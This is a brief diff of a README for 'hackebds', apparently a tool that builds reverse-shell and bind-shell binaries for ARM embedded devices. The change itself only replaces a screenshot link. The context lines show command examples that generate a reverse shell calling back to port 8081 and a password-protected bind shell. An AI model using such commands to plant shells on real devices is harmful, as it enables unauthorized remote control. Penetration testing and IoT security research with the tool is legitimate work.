@@ -52,7 +52,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
    ```
-   ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
+   ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
    
    ```
    hackebds -reverse_ip 0.0.0.0 -reverse_port 8081 -arch armelv7 -res bind_shell -passwd 1231#
